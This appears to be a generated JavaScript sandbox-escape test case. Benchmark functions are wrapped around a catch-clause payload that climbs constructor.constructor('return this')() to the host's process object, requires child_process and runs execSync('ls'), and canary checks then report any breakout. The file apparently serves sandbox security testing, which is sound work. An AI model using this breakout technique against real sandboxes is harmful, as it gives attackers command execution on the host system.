try {
    function ack(m, n) {
        throw () => {
            return () => {
            };
        };
        if (m == 0) {
            return n + 1;
        }
        if (n == 0) {
            return ack(m - 1, 1);
        }
        return ack(m - 1, ack(m, n - 1));
    }
    function fib(n) {
        if (n < 2) {
            return 1;
        }
        return fib(n - 2) + fib(n - 1);
    }
    function tak(x, y, z) {
        if (y >= x)
            return z;
        return tak(tak(x - 1, y, z), tak(y - 1, z, x), tak(z - 1, x, y));
    }
    for (var i = 3; i <= 5; i++) {
        ack(3, i);
        fib(17 + i);
        tak(3 * i + 3, 2 * i + 2, i + 1);
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}